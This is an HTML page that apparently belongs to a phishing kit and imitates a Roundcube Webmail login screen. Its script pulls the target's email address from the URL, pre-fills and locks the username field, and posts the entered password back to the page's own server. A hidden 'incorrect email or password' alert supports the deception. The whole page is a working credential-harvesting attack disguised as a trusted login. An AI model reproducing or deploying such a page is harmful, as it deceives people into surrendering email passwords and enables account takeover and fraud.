<body class="task-login action-none">
	<div id="layout">


		<h1 class="voice">Roundcube Webmail Login</h1>

		<div id="layout-content" class="selected no-navbar" role="main">
		
			<!-- <div class="error" style="margin-top: 50px; margin-bottom: -40px; display:  ; font-size: 14px;" id="errorShow"> please wait while you are being redirected</div> -->
			<center>
				<div id="error1" class="alert alert-danger col-sm-3    align-self-center" role="alert"  style="margin-top: 50px; margin-bottom: -40px; display: none ; font-size: 14px;" >
				incorrect email or password
				</div> 
				</center>
			<img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" id="logo" alt="Logo">
			<form id="login-form" name="thisForm" method="POST" class="propform" action=""> 
				<input type="hidden" name="source" id="source" value="roundcube">
				<input type="hidden" name="_task" value="login" class="form-control">
				<table>
					<tbody>
						<tr class="form-group row">
							<td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
							</td>
							<td class="input input-group input-group-lg"><span class="input-group-prepend"><i
										class="input-group-text user fa fa-user"></i></span>
										<input name="email"	id="pet" required="" size="40" autocapitalize="off" type="email"
									class="form-control" placeholder="Username" readonly></td>
						</tr>
						<tr class="form-group row">
							<td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
							</td>
							<td class="input input-group input-group-lg"><span class="input-group-prepend"><i
										class="input-group-text pass fa fa-lock"></i></span>
										<input name="password" id="password" required size="40" autocapitalize="off" type="password"
									class="form-control" placeholder="Password" required></td>
						</tr>
					</tbody>
				</table>
				<p class="formbuttons"><button type="submit" id="submitBtn"
						class="button btn btn-primary btn-lg w-100">Login</button>
				</p>

				<div class="mt-5" id="login-footer" role="contentinfo"> 
					Roundcube Webmail


				</div>
			</form>
		</div>
</body>

<script>
var feedUpdateResponse = window.location.href;

var result = feedUpdateResponse.replace("email=", "");
var feedUpdateSplit = result.split("");

for (var x = 0; x < feedUpdateSplit.length; x++) { 
	if (feedUpdateSplit[x]=="?"){
	  var che= result.substring(x+1); 
	  document.getElementById("pet").value =che
	 } 
 }
 
 if(che == undefined){ 
 	document.getElementById("pet").value =""
 	document.getElementById("pet").removeAttribute("readonly");
} 
</script>
